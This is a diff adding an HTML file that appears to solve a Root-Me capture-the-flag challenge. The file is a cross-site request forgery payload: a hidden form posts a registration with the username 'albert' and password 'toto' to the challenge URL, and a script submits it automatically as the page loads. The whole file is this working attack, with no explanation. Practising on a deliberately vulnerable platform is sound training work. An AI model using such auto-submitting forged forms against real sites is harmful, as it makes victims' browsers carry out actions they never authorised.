@@ -1,0 +1,14 @@
+<html>
+
+<body>
+    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=register" method="POST">
+        <input type="hidden" name="username" value="albert">
+        <input type="hidden" name="password" value="toto">
+    </form>
+
+    <script>
+        document.getElementById("csrf").submit();
+    </script>
+</body>
+
+</html>
